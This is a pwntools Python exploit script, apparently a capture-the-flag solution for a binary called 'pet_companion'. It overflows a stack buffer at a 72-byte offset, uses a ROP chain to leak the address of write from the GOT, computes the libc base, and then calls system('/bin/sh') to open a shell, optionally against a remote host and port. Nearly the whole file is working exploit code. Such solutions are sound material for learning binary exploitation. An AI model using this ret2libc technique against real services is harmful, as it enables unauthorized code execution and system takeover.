from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./pet_companion"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+143
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    offset = 72
    log.info("binary loaded")
    pp.recvuntil(b":")
    pop_rdi = 0x0000000000400743
    pop_rsi_pop_r15 = 0x0000000000400741
    payload = flat(
        cyclic (offset),
        pop_rdi,
        1,
        pop_rsi_pop_r15,
        elf.got.write,
        69,
        elf.plt.write,
        elf.sym.main
            )
    pp.sendline(payload)
    pp.recvuntil(b"...\n\n")
    addr = pp.recvline().rstrip()[0:8]
    print(addr)
    libc.address = u64(addr +  (b"\x00" * (8 - len(addr)))) - libc.sym.write
    log.info(f"/bin sh {hex(next(libc.search(b'/bin/sh')))} libcbase {hex(libc.address)}")
    ret = 0x00000000004004de
    payload = flat(
        cyclic(offset),
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        ret,
        ret,
        libc.sym.system,
            )
    pp.sendline(payload)
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./glibc/libc.so.6")
else:
    libc = ELF("./glibc/libc.so.6")
    # libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
